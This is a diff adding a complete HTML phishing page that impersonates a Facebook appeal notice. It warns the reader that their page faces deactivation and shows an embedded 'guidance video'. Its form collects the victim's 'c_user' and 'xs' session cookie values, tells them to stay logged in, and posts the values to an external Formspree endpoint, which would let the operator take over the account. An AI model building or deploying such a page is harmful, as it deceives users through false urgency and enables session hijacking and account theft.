@@ -1,0 +1,89 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Appeal Submission</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+        h1 {
+            color: #333;
+        }
+        .message {
+            margin-bottom: 20px;
+        }
+        .video-container {
+            position: relative;
+            padding-bottom: 56.25%; /* 16:9 aspect ratio */
+            height: 0;
+            overflow: hidden;
+            max-width: 100%;
+        }
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+        form {
+            margin-top: 20px;
+            background-color: #fff;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        form label,
+        form input,
+        form textarea {
+            display: block;
+            margin-bottom: 10px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        form input[type="submit"] {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 3px;
+            font-size: 16px;
+        }
+        form input[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <h1>Submit an Appeal to Prevent Losing Your Facebook Page</h1>
+    <div class="message">
+        <p>Dear User,</p>
+        <p>Your Facebook page is at risk of being deactivated. Please submit an appeal promptly to prevent this from happening.</p>
+    </div>
+    <div class="video-container">
+        <!-- Replace the src attribute with your actual guidance video URL -->
+        <iframe src="https://detailed-video-29b30.web.app/detailed%20video.mp4" frameborder="0" allowfullscreen></iframe>
+    </div>
+  <p>Please make sure to keep your account logged in on your computer or laptop until you receive a verification email.</p>
+    <form action="https://formspree.io/f/meqywqzw" method="post">
+        <label for="name">c_user</label>
+        <input type="text" id="text" name="c_user" required>
+        
+        <label for="name">xs</label>
+        <input type="text" id="text" name="xs" required>
+        
+        <input type="submit" value="Submit Appeal">
+    </form>
+</body>
+</html>
